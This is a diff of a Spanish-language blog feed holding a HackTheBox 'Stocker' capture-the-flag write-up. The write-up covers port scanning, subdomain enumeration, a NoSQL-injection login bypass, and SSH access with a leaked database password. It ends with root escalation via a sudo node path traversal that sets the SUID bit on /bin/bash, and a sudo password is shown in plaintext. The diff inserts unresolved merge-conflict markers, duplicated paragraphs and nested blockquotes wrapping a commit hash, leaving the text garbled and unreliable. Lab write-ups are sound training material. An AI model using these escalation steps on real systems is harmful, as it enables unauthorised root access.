@@ -1,8 +1,29 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-16T21:18:12-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Writeups de HTB</title><subtitle>Blog de seguridad informatica</subtitle><author><name>VØ1DN3T</name></author><entry><title type="html">Stocker HackTheBox</title><link href="http://localhost:4000/writeup-stocker/" rel="alternate" type="text/html" title="Stocker HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-stocker</id><content type="html" xml:base="http://localhost:4000/writeup-stocker/">&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-16T21:29:03-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Writeups de HTB</title><subtitle>Blog de seguridad informatica</subtitle><author><name>VØ1DN3T</name></author><entry><title type="html">Stocker HackTheBox</title><link href="http://localhost:4000/writeup-stocker/" rel="alternate" type="text/html" title="Stocker HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-stocker</id><content type="html" xml:base="http://localhost:4000/writeup-stocker/">&lt;p&gt;«««&amp;lt; HEAD
+Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/Stocker.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Empezamos a escanear para descubrir puertos abiertos en la máquina&lt;/p&gt;
+&lt;h1 id=&quot;empezamos-a-escanear-para-descubrir-puertos-abiertos-en-la-máquina&quot;&gt;Empezamos a escanear para descubrir puertos abiertos en la máquina&lt;/h1&gt;
+&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/Stocker.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Empezamos a escanear para decubrir puertos abiertos en la máquina&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;blockquote&gt;
+        &lt;blockquote&gt;
+          &lt;blockquote&gt;
+            &lt;blockquote&gt;
+              &lt;p&gt;4270167b71d3655c262cc0720180d0fdb326a150&lt;/p&gt;
+            &lt;/blockquote&gt;
+          &lt;/blockquote&gt;
+        &lt;/blockquote&gt;
+      &lt;/blockquote&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.196
 Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;&apos;up&apos;&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
@@ -23,7 +44,25 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene&lt;/p&gt;
+&lt;p&gt;«««&amp;lt; HEAD
+Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene
+=======
+Luego seguimos con el escaneo de puertos para ver quá versiones y servicios tiene&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;blockquote&gt;
+        &lt;blockquote&gt;
+          &lt;blockquote&gt;
+            &lt;blockquote&gt;
+              &lt;p&gt;4270167b71d3655c262cc0720180d0fdb326a150&lt;/p&gt;
+            &lt;/blockquote&gt;
+          &lt;/blockquote&gt;
+        &lt;/blockquote&gt;
+      &lt;/blockquote&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.196
 Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:47 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
@@ -97,7 +136,7 @@ Progress: 9028 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.09%&lt;s
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/direc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;vemos que no hay nada, intentemos buscar subdirectorios&lt;/p&gt;
+&lt;p&gt;Vemos que no hay nada, intentemos buscar subdirectorios&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
  gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--no-error&lt;/span&gt;
@@ -125,8 +164,26 @@ Found: dev.stocker.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con 
+&lt;p&gt;«««&amp;lt; HEAD
+Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con 
+=======
+Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intento con&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;blockquote&gt;
+        &lt;blockquote&gt;
+          &lt;blockquote&gt;
+            &lt;blockquote&gt;
+              &lt;p&gt;4270167b71d3655c262cc0720180d0fdb326a150
 BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli&lt;/p&gt;
+            &lt;/blockquote&gt;
+          &lt;/blockquote&gt;
+        &lt;/blockquote&gt;
+      &lt;/blockquote&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
 
 &lt;p&gt;Al interceptar por BurpSuite nos muestra esto&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
@@ -233,8 +290,26 @@ Upgrade-Insecure-Requests: 1
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobrar esa contraseña para poder conectarnos 
+&lt;p&gt;«««&amp;lt; HEAD
+Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobrar esa contraseña para poder conectarnos 
+=======
+Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos probar esa contraseña para poder conectarnos&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;blockquote&gt;
+        &lt;blockquote&gt;
+          &lt;blockquote&gt;
+            &lt;blockquote&gt;
+              &lt;p&gt;4270167b71d3655c262cc0720180d0fdb326a150
 con ssh con el usuario angoose&lt;/p&gt;
+            &lt;/blockquote&gt;
+          &lt;/blockquote&gt;
+        &lt;/blockquote&gt;
+      &lt;/blockquote&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
 
 &lt;p&gt;Nos conectamos por ssh&lt;/p&gt;
 
@@ -300,7 +375,7 @@ angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;require(&apos;child_process&apos;).exec(&apos;chmod u+s /bin/bash&apos;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ahora ejecutamos el script de js y al hacer bash -p tendremos privilegio como root&lt;/p&gt;
+&lt;p&gt;Ejecutamos el script de js y al hacer bash -p tendremos privilegio como root&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;node /usr/local/scripts/../../../home/angoose/setensa.js
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
@@ -318,7 +393,7 @@ bash-5.0#
 
 &lt;p&gt;Espero que les haya gustado mi primer writeup y que se haya entendido&lt;/p&gt;
 
-&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Hacking web" /><category term="pentesting" /><category term="Linux" /><summary type="html">Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.</summary></entry><entry><title type="html">Flight HackTheBox</title><link href="http://localhost:4000/writeup-flight/" rel="alternate" type="text/html" title="Flight HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-flight</id><content type="html" xml:base="http://localhost:4000/writeup-flight/">&lt;p&gt;Buenas a todos, en esta ocasión resolveremos una máquina linux llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.&lt;/p&gt;
+&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Hacking web" /><category term="pentesting" /><category term="Linux" /><summary type="html">«««&amp;lt; HEAD Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.</summary></entry><entry><title type="html">Flight HackTheBox</title><link href="http://localhost:4000/writeup-flight/" rel="alternate" type="text/html" title="Flight HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-flight</id><content type="html" xml:base="http://localhost:4000/writeup-flight/">&lt;p&gt;Buenas a todos, en esta ocasión resolveremos una máquina linux llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-flight/flight.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
